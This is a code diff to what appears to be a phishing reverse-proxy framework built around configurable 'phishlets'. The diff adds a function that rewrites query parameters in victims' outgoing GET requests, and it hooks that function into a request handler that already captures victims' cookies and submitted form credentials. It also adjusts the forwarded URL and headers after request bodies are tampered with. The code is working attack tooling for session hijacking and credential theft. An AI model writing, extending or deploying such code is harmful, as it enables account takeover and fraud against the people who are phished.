@@ -895,6 +895,78 @@ async def force_post_data(request, phishlet_id: int):
     except Exception as e:
         debug_log(f"Error in force_post_data: {e}", "ERROR")
 # 
+async def force_get_data(request, phishlet_id: int):
+    """
+    In outgoing GET request if keyword from phishlet force_get is there then do replacement.
+    Modifies the query string and stores it on request['_modified_rel_url'] for forwarding.
+    """
+    try:
+        if request.method == 'GET':
+            request_path = request.rel_url.path
+            if phishlet_id:
+                import asyncio
+                import urllib.parse
+
+                def _get_phishlet_data():
+                    from .models import Phishlet
+                    try:
+                        phishlet = Phishlet.objects.get(id=phishlet_id)
+                        return phishlet.data if isinstance(phishlet.data, dict) else {}
+                    except Phishlet.DoesNotExist:
+                        return {}
+
+                loop = asyncio.get_running_loop()
+                phishlet_data = await loop.run_in_executor(None, _get_phishlet_data)
+
+                force_get_configs = phishlet_data.get('force_get', [])
+                if not force_get_configs:
+                    return
+
+                # Parse query parameters
+                query_str = request.rel_url.query_string or ''
+                query_params = dict(urllib.parse.parse_qsl(query_str, keep_blank_values=True))
+                modified = False
+
+                for config in force_get_configs:
+                    url = config.get('url', '')
+                    method = config.get('method', 'GET').upper()
+                    keyword = config.get('keyword', '')
+                    use_regex = str(config.get('regexp', 'false')).lower() == 'true'
+                    regex_string = config.get('regexp_string', '')
+                    replace_value = config.get('replace_value', '')
+
+                    if method != 'GET' or url != request_path:
+                        continue
+
+                    if keyword and keyword in query_params:
+                        original_value = query_params[keyword]
+                        query_params[keyword] = replace_value
+                        modified = True
+                        debug_log(f"Force GET replaced '{keyword}' from '{original_value}' to '{replace_value}'", "INFO")
+                    elif use_regex and regex_string:
+                        try:
+                            import re
+                            new_query_str, count = re.subn(regex_string, replace_value, query_str)
+                            if count > 0:
+                                query_params = dict(urllib.parse.parse_qsl(new_query_str, keep_blank_values=True))
+                                modified = True
+                                debug_log(f"Force GET regex '{regex_string}' -> '{replace_value}'", "INFO")
+                        except Exception as rex:
+                            debug_log(f"Regex error in force_get: {rex}", "ERROR")
+                    else:
+                        debug_log(f"Keyword '{keyword}' not found for force_get", "DEBUG")
+
+                if modified:
+                    new_query_str = urllib.parse.urlencode(query_params, doseq=True)
+                    new_rel = request.rel_url.path
+                    if new_query_str:
+                        new_rel = f"{new_rel}?{new_query_str}"
+                    request['_modified_rel_url'] = new_rel
+                    debug_log(f"Force GET modified URL to {new_rel}", "INFO")
+
+    except Exception as e:
+        debug_log(f"Error in force_get_data: {e}", "ERROR")
+
 async def capture_form_data(request, session_cookie: str, phishlet_id: int, proxy_domain: str):
     """
     Capture form data from POST requests and update session based on phishlet credential configuration
@@ -2301,6 +2373,8 @@ async def proxy_handler(request):
                     # Capture cookies from the request
                     await capture_cookies(request, session_cookie, matching_phishlet['id'], matching_phishlet['proxy_domain'])
                     
+                    # Apply GET/POST force rules as configured
+                    await force_get_data(request, matching_phishlet['id'])
                     # Capture form data if this is a POST request
                     await capture_form_data(request, session_cookie, matching_phishlet['id'], matching_phishlet['proxy_domain'])
                     await force_post_data(request, matching_phishlet['id'])
@@ -2448,7 +2522,9 @@ async def proxy_handler(request):
     phishlet_data_for_headers = matching_phishlet.get('data') if matching_phishlet else None
     debug_log(f"request.headers: {request.headers}", "DEBUG")
     forward_headers = patch_headers_out(request.headers, incoming_host, target_host, phishlet_data_for_headers)
-    target_url = f"https://{target_host}{request.rel_url}"
+    # If force_get modified the relative URL, use that; otherwise use original
+    modified_rel = request.get('_modified_rel_url')
+    target_url = f"https://{target_host}{modified_rel if modified_rel else request.rel_url}"
     debug_log(f"Target URL: {target_url}", "DEBUG")
     debug_log(f"Forward headers: {dict(forward_headers)}", "DEBUG")
 
@@ -2480,11 +2556,24 @@ async def proxy_handler(request):
                 else:
                     debug_log(f"⏭️  No reverse filter changes needed for request body", "DEBUG")
             
+            # Ensure headers reflect any body modifications (e.g., via force_post_data)
+            try:
+                mutable_forward_headers = dict(forward_headers)
+            except Exception:
+                mutable_forward_headers = dict(forward_headers)
+            # Remove hop-by-hop headers that conflict with a fixed body length
+            mutable_forward_headers.pop('Transfer-Encoding', None)
+            # Update Content-Length to match the actual outbound body
+            try:
+                mutable_forward_headers['Content-Length'] = str(len(request_data) if request_data else 0)
+            except Exception:
+                pass
+
             # Prepare request parameters
             request_kwargs = {
                 'method': request.method,
                 'url': target_url,
-                'headers': forward_headers,
+                'headers': mutable_forward_headers,
                 'data': request_data,
                 'allow_redirects': False,
                 'ssl': False,
